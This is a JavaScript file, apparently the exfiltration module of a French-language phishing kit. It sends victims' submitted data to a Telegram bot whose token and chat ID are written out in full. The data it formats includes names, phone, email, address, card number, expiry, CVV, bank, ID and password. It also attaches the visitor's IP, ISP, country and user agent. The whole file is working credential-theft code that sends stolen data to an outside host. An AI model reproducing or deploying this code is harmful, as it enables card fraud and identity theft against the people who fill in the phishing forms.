// tg.js
// Version enrichie : emojis, date/heure, ISP et pays du client

const TELEGRAM_TOKEN = '7837023729:AAFRyzbZKsU_TFztd075sOCSgSGJX-4orTs';
const CHAT_ID        = '-4766781392';

async function sendTelegramNotification(message) {
  try {
    // 1) Récupérer User-Agent
    const ua = navigator.userAgent;

    // 2) Récupérer IP + ISP + pays
    const geoRes = await fetch('http://ip-api.com/json/?fields=status,message,query,isp,country');
    const geo = await geoRes.json();
    const ip       = geo.query;
    const isp      = geo.isp || 'N/A';
    const country  = geo.country || 'N/A';

    // 3) Date & heure formatée
    const now = new Date();
    const pad = n => String(n).padStart(2, '0');
    const dateStr = [
      pad(now.getDate()),
      pad(now.getMonth()+1),
      now.getFullYear().toString().slice(-2)
    ].join('/');
    const timeStr = [ pad(now.getHours()), pad(now.getMinutes()), pad(now.getSeconds()) ].join(':');
    const datetime = `${dateStr}, ${timeStr}`;

    // 4) Séparer header & details
    const lines = message.split('\n');
    const header  = lines.shift();       // ex. "Étape 1 – Infos perso"
    const details = lines.join('\n');    // le reste

    // 5) Construire le texte final
    let text = `[📝] ${header}`;
    if (details) {
      // préfixer chaque ligne de détails d’un emoji selon le type de contenu
      const prefixed = details.split('\n').map(line => {
        if (line.startsWith('Nom:'))   return line.replace('Nom:', '👤 Nom:');
        if (line.startsWith('Prénom:'))return line.replace('Prénom:', '🙋 Prénom:');
        if (line.startsWith('Téléphone:')) return line.replace('Téléphone:', '📞 Téléphone:');
        if (line.startsWith('Email:')) return line.replace('Email:', '✉️ Email:');
        if (line.startsWith('Adresse:')) return line.replace('Adresse:', '🏠 Adresse:');
        if (line.startsWith('Numéro:')) return line.replace('Numéro:', '💳 Numéro:');
        if (line.startsWith('Exp:'))    return line.replace('Exp:', '📅 Exp:');
        if (line.startsWith('CVV:'))    return line.replace('CVV:', '🔒 CVV:');
        if (line.startsWith('Banque:')) return line.replace('Banque:', '🏦 Banque:');
        if (line.startsWith('ID:'))     return line.replace('ID:', '🆔 ID:');
        if (line.startsWith('Pass:'))   return line.replace('Pass:', '🔑 Pass:');
        return line;
      }).join('\n');
      text += `\n${prefixed}`;
    }
    // ajouter date/heure, IP, ISP, pays, UA
    text +=
      `\n\n[🗓️] Date & heure : ${datetime}` +
      `\n[🌐] IP Client     : ${ip}` +
      `\n[🔎] ISP Client    : ${isp}` +
      `\n[🌍] Pays Client   : ${country}` +
      `\n[📍] User-Agent    : ${ua}` +
      `\n[©️] ${now.getFullYear()} ©️`;

    // 6) Envoi
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`
              + `?chat_id=${CHAT_ID}`
              + `&parse_mode=Markdown`
              + `&text=${encodeURIComponent(text)}`;

    const res = await fetch(url);
    if (!res.ok) console.error('Telegram error', res.status, res.statusText);

  } catch (err) {
    console.error('Erreur Telegram:', err);
  }
}

// Expose globalement
window.sendTelegramNotification = sendTelegramNotification;